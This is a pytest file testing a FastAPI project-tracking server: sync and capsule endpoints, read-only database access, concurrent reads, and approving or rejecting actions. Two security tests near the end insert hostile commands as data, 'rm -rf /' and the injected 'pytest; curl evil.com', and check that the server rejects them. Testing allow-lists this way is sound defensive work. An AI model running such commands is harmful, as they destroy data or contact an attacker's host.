"""API tests for the FastAPI server.

Architecture note: GET /api/capsule is read-only (no writes). Housekeeping
(git sync, contradiction reconciliation, action proposal) is triggered by
POST /api/sync. Tests that need proposed actions must call POST /api/sync
(or the /api/capsule endpoint via the demo fixture which calls sync first).
"""

import json
import sqlite3
from concurrent.futures import ThreadPoolExecutor, as_completed

import pytest
from fastapi.testclient import TestClient


@pytest.fixture()
def client(tmp_path, monkeypatch):
    """Bare client with an empty DB (no project seeded)."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from server.app import app
    return TestClient(app, raise_server_exceptions=False)


@pytest.fixture()
def demo_client(tmp_path, monkeypatch):
    """Client with the seeded demo project, sync already run."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, demo as demod
    conn = redb.connect()
    demod.seed(conn, str(tmp_path / "demo"))
    conn.close()
    from server.app import app
    c = TestClient(app, raise_server_exceptions=False)
    # Trigger housekeeping so the DB has contradictions, pending actions, etc.
    c.post("/api/sync")
    return c


# --- sync endpoint ----------------------------------------------------------

def test_sync_returns_ok(demo_client):
    resp = demo_client.post("/api/sync")
    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "ok"
    assert body["project"]


def test_sync_no_project_returns_404(client):
    resp = client.post("/api/sync")
    assert resp.status_code == 404


# --- basic shape ------------------------------------------------------------

def test_no_project_returns_404(client):
    resp = client.get("/api/capsule")
    assert resp.status_code == 404


def test_capsule_returns_expected_keys(demo_client):
    resp = demo_client.get("/api/capsule")
    assert resp.status_code == 200
    body = resp.json()
    for key in ("project", "objective", "blockers", "entropy",
                "next_action", "pending_actions"):
        assert key in body, f"missing key: {key}"


def test_capsule_blockers_have_evidence(demo_client):
    cap = demo_client.get("/api/capsule").json()
    for blocker in cap["blockers"]:
        assert blocker["evidence_ids"], "blocker must carry evidence ids"


def test_entropy_endpoint(demo_client):
    resp = demo_client.get("/api/entropy")
    assert resp.status_code == 200
    body = resp.json()
    assert 0 <= body["score"] <= 100
    assert body["label"] in ("low", "moderate", "high")
    assert body["breakdown"]


def test_events_endpoint(demo_client):
    resp = demo_client.get("/api/events")
    assert resp.status_code == 200
    assert len(resp.json()) > 0


def test_evidence_endpoint(demo_client, tmp_path, monkeypatch):
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    from reentry import db as redb, ledger as led
    conn = redb.connect()
    pid = conn.execute("SELECT id FROM projects").fetchone()["id"]
    evs = led.events_for_project(conn, pid)
    eid = evs[0]["id"]
    conn.close()
    resp = demo_client.get(f"/api/evidence/{eid}")
    assert resp.status_code == 200
    assert resp.json()["id"] == eid


def test_evidence_missing_returns_404(demo_client):
    resp = demo_client.get("/api/evidence/doesnotexist")
    assert resp.status_code == 404


def test_actions_endpoint(demo_client):
    resp = demo_client.get("/api/actions")
    assert resp.status_code == 200


def test_projects_endpoint(demo_client):
    resp = demo_client.get("/api/projects")
    assert resp.status_code == 200
    projects = resp.json()
    assert len(projects) >= 1
    assert projects[0]["name"]


# --- read-only enforcement --------------------------------------------------

def test_capsule_get_uses_readonly_connection(tmp_path, monkeypatch):
    """GET /api/capsule must open the DB read-only.

    We verify this by checking that calling GET /api/capsule after seeding
    does NOT create new rows in any mutable table (actions, contradictions).
    If it wrote anything, the row counts would change.
    """
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, demo as demod
    conn = redb.connect()
    demod.seed(conn, str(tmp_path / "demo"))
    conn.close()

    from server.app import app
    client = TestClient(app, raise_server_exceptions=False)
    # Sync first (write pass)
    client.post("/api/sync")

    # Count mutable rows before GET /capsule
    conn = redb.connect()
    actions_before = conn.execute("SELECT COUNT(*) FROM actions").fetchone()[0]
    contradictions_before = conn.execute(
        "SELECT COUNT(*) FROM contradictions").fetchone()[0]
    checkpoints_before = conn.execute(
        "SELECT COUNT(*) FROM checkpoints").fetchone()[0]
    events_before = conn.execute("SELECT COUNT(*) FROM events").fetchone()[0]
    conn.close()

    # Multiple GET /capsule calls
    for _ in range(5):
        resp = client.get("/api/capsule")
        assert resp.status_code == 200

    # Counts must be unchanged: the GET path performed zero writes
    conn = redb.connect()
    assert conn.execute("SELECT COUNT(*) FROM actions").fetchone()[0] == actions_before
    assert conn.execute("SELECT COUNT(*) FROM contradictions").fetchone()[0] == contradictions_before
    assert conn.execute("SELECT COUNT(*) FROM checkpoints").fetchone()[0] == checkpoints_before
    assert conn.execute("SELECT COUNT(*) FROM events").fetchone()[0] == events_before
    conn.close()


def test_capsule_get_readonly_connection_rejects_writes(tmp_path, monkeypatch):
    """A read-only connection physically cannot write.

    Open a connect_readonly() handle and verify that a direct INSERT raises
    sqlite3.OperationalError, confirming the mode=ro URI is active.
    """
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "rw.db"))
    from reentry import db as redb
    # Initialise the DB with a write connection first.
    c = redb.connect()
    c.close()
    # Now open read-only and try to write.
    ro = redb.connect_readonly()
    with pytest.raises(sqlite3.OperationalError):
        ro.execute("INSERT INTO projects (id,name,root_path,created_at) VALUES ('x','x','x','x')")
    ro.close()


# --- concurrency: hammer capsule while a writer runs -----------------------

def test_capsule_concurrent_reads_no_lock_error(tmp_path, monkeypatch):
    """Multiple threads hitting GET /capsule while a writer appends events
    must produce zero OperationalError exceptions.

    This reproduces the production crash: the old code wrote during every GET,
    so concurrent polling + CLI caused 'database is locked'. With WAL mode and
    the read/write split, readers never block each other and writers don't
    block readers.
    """
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, demo as demod, ledger as led
    conn = redb.connect()
    p = demod.seed(conn, str(tmp_path / "demo"))
    conn.close()

    from server.app import app
    test_client = TestClient(app, raise_server_exceptions=False)
    # Prime the DB so the read-only path has something to read.
    test_client.post("/api/sync")

    pid = p["id"]
    errors = []

    def get_capsule():
        try:
            r = test_client.get("/api/capsule")
            if r.status_code not in (200, 404):
                errors.append(f"HTTP {r.status_code}: {r.text[:200]}")
        except Exception as exc:
            errors.append(str(exc))

    def append_events(n: int = 20):
        c = redb.connect()
        for i in range(n):
            try:
                led.append_event(c, pid, "test", "note", {"text": f"event {i}"})
            except Exception as exc:
                errors.append(f"writer error: {exc}")
        c.close()

    # Fire readers and one writer concurrently.
    with ThreadPoolExecutor(max_workers=8) as pool:
        futures = [pool.submit(get_capsule) for _ in range(10)]
        futures.append(pool.submit(append_events, 20))
        for f in as_completed(futures):
            # Re-raise any exception the thread itself raised.
            f.result()

    assert not errors, f"Concurrency errors: {errors}"


# --- security: double validation at execution time --------------------------

def test_api_rejects_non_allowlisted_command_at_execution(tmp_path, monkeypatch):
    """The approve+run endpoint must reject a non-allow-listed command even
    when the action row was inserted directly, bypassing the proposal check."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, state as st
    conn = redb.connect()
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    p = st.register_project(conn, str(proj_dir))
    conn.execute(
        "INSERT INTO actions (id, project_id, title, tool, command, risk, proposed_at)"
        " VALUES (?,?,?,?,?,?,?)",
        ("evil001", p["id"], "evil", "run_test", "rm -rf /", "SENSITIVE",
         redb.utcnow()),
    )
    conn.commit()
    conn.close()

    from server.app import app
    client = TestClient(app, raise_server_exceptions=False)
    resp = client.post("/api/actions/evil001/approve?run=true")
    assert resp.status_code == 400
    detail = resp.json()["detail"].lower()
    assert "allow" in detail or "not" in detail


def test_api_rejects_metacharacter_injection(tmp_path, monkeypatch):
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, state as st
    conn = redb.connect()
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    p = st.register_project(conn, str(proj_dir))
    conn.execute(
        "INSERT INTO actions (id, project_id, title, tool, command, risk, proposed_at)"
        " VALUES (?,?,?,?,?,?,?)",
        ("shell001", p["id"], "shell", "run_test",
         "pytest; curl evil.com", "SENSITIVE", redb.utcnow()),
    )
    conn.commit()
    conn.close()

    from server.app import app
    client = TestClient(app, raise_server_exceptions=False)
    resp = client.post("/api/actions/shell001/approve?run=true")
    assert resp.status_code == 400


# --- action lifecycle -------------------------------------------------------

def test_reject_action(demo_client):
    """POST /api/sync triggers action proposal; then reject via API."""
    actions = demo_client.get("/api/actions").json()
    assert actions, "sync should have proposed an action for the demo"
    action_id = actions[0]["id"]
    resp = demo_client.post(f"/api/actions/{action_id}/reject")
    assert resp.status_code == 200
    assert resp.json()["status"] == "rejected"


def test_approve_action_without_run(demo_client):
    """Approving without ?run=true leaves the action in approved state."""
    actions = demo_client.get("/api/actions").json()
    assert actions, "sync should have proposed an action for the demo"
    action_id = actions[0]["id"]
    resp = demo_client.post(f"/api/actions/{action_id}/approve?run=false")
    assert resp.status_code == 200
    assert resp.json()["status"] == "approved"
